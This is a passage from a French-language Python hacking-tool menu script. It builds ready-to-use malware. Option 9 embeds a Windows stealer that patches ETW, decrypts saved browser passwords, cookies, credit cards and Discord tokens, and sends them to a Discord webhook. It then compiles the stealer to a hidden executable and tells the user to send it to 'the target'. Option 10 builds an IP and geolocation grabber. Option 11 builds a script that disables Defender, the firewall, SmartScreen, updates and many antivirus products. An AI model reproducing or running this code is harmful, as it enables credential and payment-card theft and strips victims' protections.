                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_9():
    clear()
    banner()

    print(f"\n{CYAN}   [ PASSWORD STEALER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    source = r'''import os, sys, json, base64, ctypes, sqlite3, subprocess, shutil, socket, platform
import requests, win32crypt
from Crypto.Cipher import AES
from datetime import datetime

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

WEBHOOK = "__WEBHOOK_URL__"
APPDATA = os.getenv("APPDATA", "")
LOCAL = os.getenv("LOCALAPPDATA", "")
TEMP = os.getenv("TEMP", "")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

BROWSERS = {
    "Chrome":     os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    "Chrome Beta": os.path.join(LOCAL, "Google", "Chrome Beta", "User Data"),
    "Edge":       os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    "Brave":      os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Vivaldi":    os.path.join(LOCAL, "Vivaldi", "User Data"),
    "Opera":      os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "Opera GX":   os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
    "Yandex":     os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
}

def get_sysinfo():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "public_ip": ip,
        "timestamp": datetime.now().isoformat(),
    }

def get_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt(enc, key):
    try:
        if not enc:
            return ""
        if enc[:3] in (b"v10", b"v11"):
            iv, payload, tag = enc[3:15], enc[15:-16], enc[-16:]
            c = AES.new(key, AES.MODE_GCM, iv)
            return c.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception:
        return ""

def profiles(root):
    if not os.path.isdir(root):
        return []
    out = []
    d = os.path.join(root, "Default")
    if os.path.isdir(d):
        out.append(d)
    try:
        for x in sorted(os.listdir(root)):
            p = os.path.join(root, x)
            if x.startswith("Profile ") and os.path.isdir(p):
                out.append(p)
    except Exception:
        pass
    return out

def copy_db(src):
    if not os.path.exists(src):
        return None
    tmp = os.path.join(TEMP, f"_db_{os.getpid()}_{os.urandom(4).hex()}.db")
    try:
        shutil.copy2(src, tmp)
        return tmp
    except Exception:
        return None

def x_passwords(profile, key):
    db = copy_db(os.path.join(profile, "Login Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for url, user, enc in con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ):
            if not enc:
                continue
            pw = decrypt(enc, key)
            if pw:
                out.append({"url": url, "user": user, "pass": pw})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_cookies(profile, key):
    for c in [os.path.join(profile, "Network", "Cookies"), os.path.join(profile, "Cookies")]:
        db = copy_db(c)
        if not db:
            continue
        out = []
        try:
            con = sqlite3.connect(db)
            for host, name, enc in con.execute(
                "SELECT host_key, name, encrypted_value FROM cookies LIMIT 1000"
            ):
                if not enc:
                    continue
                v = decrypt(enc, key)
                if v:
                    out.append({"host": host, "name": name, "value": v[:200]})
            con.close()
        except Exception:
            pass
        finally:
            try: os.remove(db)
            except: pass
        return out
    return []

def x_cards(profile, key):
    db = copy_db(os.path.join(profile, "Web Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for name, month, year, number, enc in con.execute(
            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, card_number_encrypted FROM credit_cards"
        ):
            num = decrypt(enc, key) if enc else ""
            if num or name:
                out.append({
                    "name": name,
                    "exp": f"{month}/{year}" if month and year else "",
                    "number": num,
                })
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_autofill(profile):
    db = copy_db(os.path.join(profile, "Web Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for name, value in con.execute(
            "SELECT name, value FROM autofill LIMIT 200"
        ):
            if name and value:
                out.append({"field": name, "value": value})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_history(profile, limit=200):
    db = copy_db(os.path.join(profile, "History"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for url, title, cnt in con.execute(
            f"SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT {limit}"
        ):
            out.append({"url": url[:150], "title": (title or "")[:80], "visits": cnt})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_tokens(profile, key):
    import re
    ldb = os.path.join(profile, "Local Storage", "leveldb")
    if not os.path.isdir(ldb):
        return []
    TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|dQw4w9WgXcQ:[^\"]*")
    found = set()
    try:
        for f in os.listdir(ldb):
            if not f.endswith((".ldb", ".log")):
                continue
            try:
                with open(os.path.join(ldb, f), "r", errors="ignore") as fh:
                    for line in fh:
                        for m in TOKEN_RE.findall(line):
                            found.add(m)
            except Exception:
                continue
    except Exception:
        pass
    out = []
    for raw in found:
        if raw.startswith("dQw4w9WgXcQ:"):
            t = decrypt(base64.b64decode(raw.split(":")[1]), key)
        else:
            t = raw
        if t:
            out.append(t)
    return out

def send_embed(title, description, color=0xFFFFFF):
    for chunk in [description[i:i+1900] for i in range(0, len(description), 1900)]:
        try:
            HTTP.post(WEBHOOK, json={"embeds": [{
                "title": title,
                "description": chunk,
                "color": color,
            }]}, timeout=15)
        except Exception:
            pass

def send_file(path, filename):
    try:
        with open(path, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": (filename, f.read(), "application/json")}, timeout=60)
    except Exception:
        pass

def main():
    sysinfo = get_sysinfo()

    header = (
        f"**Hostname** : `{sysinfo['hostname']}`\n"
        f"**User** : `{sysinfo['username']}`\n"
        f"**OS** : `{sysinfo['os']}` ({sysinfo['arch']})\n"
        f"**IP** : `{sysinfo['public_ip']}`\n"
        f"**Date** : `{sysinfo['timestamp']}`"
    )
    send_embed("Password Stealer — Système", header, color=0xFFFFFF)

    total_pw = 0
    total_cks = 0
    total_cards = 0
    total_tokens = 0
    all_data = {"system": sysinfo, "browsers": {}}

    for name, root in BROWSERS.items():
        if not os.path.isdir(root):
            continue
        key = get_key(root)
        if not key:
            continue

        browser_data = {"passwords": [], "cookies": [], "cards": [],
                        "autofill": [], "history": [], "tokens": []}

        for prof in profiles(root):
            try:
                pws = x_passwords(prof, key)
                browser_data["passwords"].extend(pws)
                total_pw += len(pws)

                cks = x_cookies(prof, key)
                browser_data["cookies"].extend(cks)
                total_cks += len(cks)

                crds = x_cards(prof, key)
                browser_data["cards"].extend(crds)
                total_cards += len(crds)

                af = x_autofill(prof)
                browser_data["autofill"].extend(af)

                hist = x_history(prof)
                browser_data["history"].extend(hist)

                tks = x_tokens(prof, key)
                browser_data["tokens"].extend(tks)
                total_tokens += len(tks)
            except Exception:
                continue

        if any(browser_data.values()):
            all_data["browsers"][name] = browser_data

    pw_lines = []
    for bname, bdata in all_data["browsers"].items():
        if not bdata["passwords"]:
            continue
        pw_lines.append(f"\n__**{bname}**__ ({len(bdata['passwords'])} entrées)")
        for p in bdata["passwords"][:25]:
            pw_lines.append(
                f"`URL  :` {p['url'][:80]}\n"
                f"`User :` {p['user']}\n"
                f"`Pass :` {p['pass']}\n---"
            )
        if len(bdata["passwords"]) > 25:
            pw_lines.append(f"_... +{len(bdata['passwords']) - 25} autres_")
    if pw_lines:
        send_embed(f"Passwords ({total_pw} trouvés)", "\n".join(pw_lines))

    card_lines = []
    for bname, bdata in all_data["browsers"].items():
        if not bdata["cards"]:
            continue
        card_lines.append(f"\n__**{bname}**__")
        for c in bdata["cards"]:
            card_lines.append(
                f"`Name :` {c['name']}\n"
                f"`Num  :` {c['number']}\n"
                f"`Exp  :` {c['exp']}\n---"
            )
    if card_lines:
        send_embed(f"Cartes bancaires ({total_cards})", "\n".join(card_lines), color=0xFFFFFF)

    token_lines = []
    for bname, bdata in all_data["browsers"].items():
        if not bdata["tokens"]:
            continue
        token_lines.append(f"\n__**{bname}**__ ({len(bdata['tokens'])} tokens)")
        for t in bdata["tokens"]:
            token_lines.append(f"`{t}`")
    if token_lines:
        send_embed(f"Discord Tokens ({total_tokens})", "\n".join(token_lines), color=0xFFFFFF)

    resume = (
        f"**Passwords** : {total_pw}\n"
        f"**Cookies** : {total_cks}\n"
        f"**Cartes** : {total_cards}\n"
        f"**Tokens Discord** : {total_tokens}\n"
        f"**Navigateurs** : {', '.join(all_data['browsers'].keys()) or 'aucun'}"
    )
    send_embed("Résumé Password Stealer", resume, color=0xFFFFFF)

    try:
        tmp_json = os.path.join(TEMP, f"stealer_{os.getpid()}.json")
        with open(tmp_json, "w", encoding="utf-8") as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        send_file(tmp_json, "passwords_full.json")
        os.remove(tmp_json)
    except Exception:
        pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = source.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_pw_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_pw")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "password_stealer",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=win32crypt",
        "--hidden-import=Crypto.Cipher",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "password_stealer.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie password_stealer.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "password_stealer.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_10():
    clear()
    banner()

    print(f"\n{CYAN}   [ IP GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    grabber_code = r'''import os, sys, json, socket, platform, subprocess, uuid, ctypes
from datetime import datetime
import requests

WEBHOOK = "__WEBHOOK_URL__"

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def get_public_ip():
    for url in ("https://api.ipify.org?format=json", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            r = HTTP.get(url, timeout=5)
            if "json" in url:
                return r.json().get("ip", "?")
            return r.text.strip()
        except Exception:
            continue
    return "Unknown"

def get_local_ips():
    ips = []
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    return ips

def get_geo(ip):
    try:
        r = HTTP.get(
            f"http://ip-api.com/json/{ip}"
            "?fields=status,country,countryCode,regionName,city,zip,"
            "lat,lon,timezone,isp,org,as,asname,reverse,proxy,hosting,mobile,query",
            timeout=8,
        )
        data = r.json()
        if data.get("status") == "success":
            return data
    except Exception:
        pass
    return {}

def get_mac():
    try:
        mac = uuid.getnode()
        return ":".join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
    except Exception:
        return "Unknown"

def get_sysinfo():
    try:
        user = os.getlogin()
    except Exception:
        user = os.getenv("USERNAME", "Unknown")

    boot = "Unknown"
    try:
        r = subprocess.check_output(
            ["wmic", "os", "get", "lastbootuptime"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        if len(r) >= 2:
            boot = r[1].strip()
    except Exception:
        pass

    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": f"{platform.system()} {platform.release()}",
        "os_version": platform.version(),
        "arch": platform.machine(),
        "processor": platform.processor(),
        "boot_time": boot,
        "mac": get_mac(),
        "cwd": os.getcwd(),
        "python": platform.python_version(),
        "timestamp": datetime.now().isoformat(),
    }

def get_gpu():
    try:
        out = subprocess.check_output(
            ["wmic", "path", "win32_VideoController", "get", "name"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        return [l.strip() for l in out[1:] if l.strip()]
    except Exception:
        return []

def get_cpu():
    try:
        out = subprocess.check_output(
            ["wmic", "cpu", "get", "name"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        return [l.strip() for l in out[1:] if l.strip()]
    except Exception:
        return []

def get_ram():
    try:
        out = subprocess.check_output(
            ["wmic", "ComputerSystem", "get", "TotalPhysicalMemory"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        if len(out) >= 2:
            b = int(out[1].strip())
            return f"{b / (1024**3):.1f} GB"
    except Exception:
        pass
    return "Unknown"

def get_disks():
    try:
        out = subprocess.check_output(
            ["wmic", "logicaldisk", "get", "DeviceID,Size,FreeSpace"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        disks = []
        for line in out[1:]:
            parts = line.split()
            if len(parts) == 3:
                dev, free, size = parts
                try:
                    disks.append({
                        "drive": dev,
                        "size_gb": round(int(size) / (1024**3), 1),
                        "free_gb": round(int(free) / (1024**3), 1),
                    })
                except Exception:
                    pass
        return disks
    except Exception:
        return []

def get_installed_browsers():
    browsers = []
    local = os.getenv("LOCALAPPDATA", "")
    appdata = os.getenv("APPDATA", "")
    for name, path in {
        "Chrome": os.path.join(local, "Google", "Chrome", "Application", "chrome.exe"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "Application", "msedge.exe"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        "Firefox": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable", "opera.exe"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable", "opera.exe"),
        "Vivaldi": os.path.join(local, "Vivaldi", "Application", "vivaldi.exe"),
        "Discord": os.path.join(local, "Discord", "Update.exe"),
    }.items():
        if os.path.exists(path):
            browsers.append(name)
    return browsers

def send_embed(title, fields, color=0xFFFFFF):
    try:
        HTTP.post(WEBHOOK, json={
            "embeds": [{
                "title": title,
                "color": color,
                "fields": fields,
                "timestamp": datetime.utcnow().isoformat(),
            }]
        }, timeout=15)
    except Exception:
        pass

def main():
    pub_ip = get_public_ip()
    geo = get_geo(pub_ip)
    sysinfo = get_sysinfo()
    local_ips = get_local_ips()
    gpus = get_gpu()
    cpus = get_cpu()
    ram = get_ram()
    disks = get_disks()
    browsers = get_installed_browsers()

    ip_fields = [
        {"name": "Public IP", "value": f"`{pub_ip}`", "inline": True},
        {"name": "Local IPs", "value": "`" + ", ".join(local_ips[:5]) + "`" if local_ips else "N/A", "inline": True},
        {"name": "MAC", "value": f"`{sysinfo['mac']}`", "inline": True},
        {"name": "Country", "value": f"{geo.get('country', 'N/A')} ({geo.get('countryCode', '?')})", "inline": True},
        {"name": "Region", "value": geo.get("regionName", "N/A"), "inline": True},
        {"name": "City", "value": geo.get("city", "N/A"), "inline": True},
        {"name": "ZIP", "value": geo.get("zip", "N/A"), "inline": True},
        {"name": "Timezone", "value": geo.get("timezone", "N/A"), "inline": True},
        {"name": "Coords", "value": f"`{geo.get('lat', '?')}, {geo.get('lon', '?')}`", "inline": False},
        {"name": "ISP", "value": geo.get("isp", "N/A"), "inline": False},
        {"name": "Org", "value": geo.get("org", "N/A"), "inline": False},
        {"name": "ASN", "value": geo.get("as", "N/A"), "inline": False},
        {"name": "Reverse DNS", "value": geo.get("reverse", "N/A"), "inline": False},
        {"name": "Type", "value": (
            ("VPN/Proxy " if geo.get("proxy") else "")
            + ("Hosting " if geo.get("hosting") else "")
            + ("Mobile" if geo.get("mobile") else "")
            or "Residential"
        ), "inline": False},
    ]
    send_embed(f"IP Grabber — {sysinfo['hostname']}", ip_fields, color=0xFFFFFF)

    sys_fields = [
        {"name": "Hostname", "value": f"`{sysinfo['hostname']}`", "inline": True},
        {"name": "User", "value": f"`{sysinfo['username']}`", "inline": True},
        {"name": "OS", "value": f"{sysinfo['os']} ({sysinfo['arch']})", "inline": True},
        {"name": "OS Version", "value": f"`{sysinfo['os_version']}`", "inline": False},
        {"name": "CPU", "value": "```" + "\n".join(cpus) + "```" if cpus else "N/A", "inline": False},
        {"name": "GPU", "value": "```" + "\n".join(gpus) + "```" if gpus else "N/A", "inline": False},
        {"name": "RAM", "value": ram, "inline": True},
        {"name": "CWD", "value": f"`{sysinfo['cwd']}`", "inline": False},
        {"name": "Python", "value": sysinfo["python"], "inline": True},
        {"name": "Boot time", "value": f"`{sysinfo['boot_time']}`", "inline": False},
    ]
    send_embed("System Info", sys_fields, color=0xFFFFFF)

    extra_fields = []
    if disks:
        disk_lines = [f"`{d['drive']}` {d['free_gb']}/{d['size_gb']} GB free" for d in disks]
        extra_fields.append({"name": "Disks", "value": "\n".join(disk_lines), "inline": False})
    if browsers:
        extra_fields.append({"name": "Browsers installed", "value": "`" + ", ".join(browsers) + "`", "inline": False})

    if extra_fields:
        send_embed("Storage & Software", extra_fields, color=0xFFFFFF)

    full = {
        "ip": pub_ip,
        "geo": geo,
        "system": sysinfo,
        "local_ips": local_ips,
        "gpus": gpus,
        "cpus": cpus,
        "ram": ram,
        "disks": disks,
        "browsers": browsers,
    }
    try:
        tmp = os.path.join(os.getenv("TEMP", "."), f"ip_{os.getpid()}.json")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(full, f, indent=2, ensure_ascii=False)
        with open(tmp, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": ("ip_full.json", f.read(), "application/json")}, timeout=30)
        os.remove(tmp)
    except Exception:
        pass

if __name__ == "__main__":
    main()
'''

    src = grabber_code.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_ipgrabber_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_ipgrabber")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "ip_grabber",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "ip_grabber.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie ip_grabber.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "ip_grabber.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_11():
    clear()
    banner()

    AVS = {
        "1":  ("Windows Defender", "defender"),
        "2":  ("Malwarebytes", "malwarebytes"),
        "3":  ("Avast", "avast"),
        "4":  ("AVG", "avg"),
        "5":  ("Kaspersky", "kaspersky"),
        "6":  ("Bitdefender", "bitdefender"),
        "7":  ("Norton", "norton"),
        "8":  ("McAfee", "mcafee"),
        "9":  ("ESET", "eset"),
        "10": ("Sophos", "sophos"),
        "11": ("Trend Micro", "trendmicro"),
        "12": ("Panda", "panda"),
        "13": ("Webroot", "webroot"),
        "14": ("F-Secure", "fsecure"),
        "15": ("G Data", "gdata"),
        "16": ("Comodo", "comodo"),
        "17": ("360 Total Security", "360"),
        "18": ("Windows Firewall", "firewall"),
        "19": ("Windows SmartScreen", "smartscreen"),
        "20": ("Windows Update", "windowsupdate"),
    }

    print(f"\n{CYAN}   [ AV DISABLER BUILDER ]{RESET}\n")
    for k, (n, _) in AVS.items():
        print(f"  {k:>2}. {n}")
    print(f"\n{GRAY}Exemple : 1,2,5  ou  all{RESET}")

    choice = input(f"{YELLOW}[?]{RESET} > ").strip().lower()
    if choice == "all":
        ids = list(AVS.keys())
    else:
        ids = [c.strip() for c in choice.split(",") if c.strip() in AVS]

    if not ids:
        print(f"{RED}[!] Aucun choix valide.{RESET}")
        pause()
        return

    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL (vide = pas de report) -> ").strip()
    send_report = webhook.startswith("https://discord.com/api/webhooks/")

    clefs = [AVS[i][1] for i in ids]
    noms = [AVS[i][0] for i in ids]

    source = r'''# auto-genere par mytool.py
# cibles : __TARGETS__
# lancer en ADMINISTRATEUR
import subprocess, sys, ctypes, os, json, platform, socket
from datetime import datetime

WEBHOOK = "__WEBHOOK_URL__"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate():
    if is_admin():
        return True
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join(f'"{a}"' for a in sys.argv),
            None, 1
        )
    except Exception:
        pass
    return False

def run(cmd):
    try:
        subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    except Exception:
        pass

def disable_defender():
    run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"')
    run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"')
    run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"')
    run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"')
    run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"')
    run('powershell -Command "Set-MpPreference -MAPSReporting 0"')
    cmds = [
        "sc stop WinDefend", "sc config WinDefend start= disabled",
        "sc stop WdNisSvc", "sc config WdNisSvc start= disabled",
        "sc stop Sense", "sc config Sense start= disabled",
        "sc stop SecurityHealthService", "sc config SecurityHealthService start= disabled",
        "sc stop wscsvc", "sc config wscsvc start= disabled",
        "sc stop MsMpEng", "sc config MsMpEng start= disabled",
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f',
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
        r'schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable',
        r'schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable',
    ]
    for c in cmds:
        run(c)

def disable_firewall():
    cmds = [
        "netsh advfirewall set allprofiles state off",
        "netsh firewall set opmode disable",
        "sc stop mpssvc", "sc config mpssvc start= disabled",
        "sc stop BFE", "sc config BFE start= disabled",
        "sc stop MpsSvc", "sc config MpsSvc start= disabled",
    ]
    for c in cmds:
        run(c)

def disable_malwarebytes():
    for proc in ("mbam.exe", "mbamtray.exe", "MBAMService.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop MBAMService", "sc config MBAMService start= disabled"]:
        run(c)

def disable_avast():
    for proc in ("AvastSvc.exe", "AvastUI.exe", "aswidsagent.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AvastSvc", "sc config AvastSvc start= disabled"]:
        run(c)

def disable_avg():
    for proc in ("avgui.exe", "avgsvc.exe", "avgwdsvc.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AVG Antivirus", "sc config AVG Antivirus start= disabled"]:
        run(c)

def disable_kaspersky():
    for proc in ("avp.exe", "avpui.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AVP", "sc config AVP start= disabled"]:
        run(c)

def disable_bitdefender():
    for proc in ("vsserv.exe", "bdagent.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop VSSERV", "sc config VSSERV start= disabled"]:
        run(c)

def disable_norton():
    for proc in ("nortonsecurity.exe", "nortonsecurityui.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop NortonSecurity", "sc config NortonSecurity start= disabled"]:
        run(c)

def disable_mcafee():
    for proc in ("mcshield.exe", "mcafeefire.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop McAfeeEngineService", "sc config McAfeeEngineService start= disabled"]:
        run(c)

def disable_eset():
    for proc in ("egui.exe", "ekrn.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop ekrn", "sc config ekrn start= disabled"]:
        run(c)

def disable_sophos():
    for proc in ("SophosUI.exe", "SophosFileScanner.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop SophosAgent", "sc config SophosAgent start= disabled"]:
        run(c)

def disable_trendmicro():
    for proc in ("tmntsrv.exe", "tmccsf.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop Amsp", "sc config Amsp start= disabled"]:
        run(c)

def disable_panda():
    for proc in ("PSANHost.exe",):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop PSANHost", "sc config PSANHost start= disabled"]:
        run(c)

def disable_webroot():
    for proc in ("WRSA.exe", "WRSVC.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop WRSVC", "sc config WRSVC start= disabled"]:
        run(c)

def disable_fsecure():
    for proc in ("fsui.exe", "fsservice.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop F-Secure Hoster", "sc config F-Secure Hoster start= disabled"]:
        run(c)

def disable_gdata():
    for proc in ("AVK.exe",):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop G DATA AntiVirus Engine", "sc config G DATA AntiVirus Engine start= disabled"]:
        run(c)

def disable_comodo():
    for proc in ("cmdagent.exe", "cavwp.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop cmdAgent", "sc config cmdAgent start= disabled"]:
        run(c)

def disable_360():
    for proc in ("360tray.exe", "360rp.exe", "ZhuDongFangYu.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop 360rp", "sc config 360rp start= disabled"]:
        run(c)

def disable_smartscreen():
    cmds = [
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f',
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f',
    ]
    for c in cmds:
        run(c)

def disable_windowsupdate():
    cmds = [
        "sc stop wuauserv", "sc config wuauserv start= disabled",
        "sc stop UsoSvc", "sc config UsoSvc start= disabled",
        "sc stop BITS", "sc config BITS start= disabled",
    ]
    for c in cmds:
        run(c)

def report(targets):
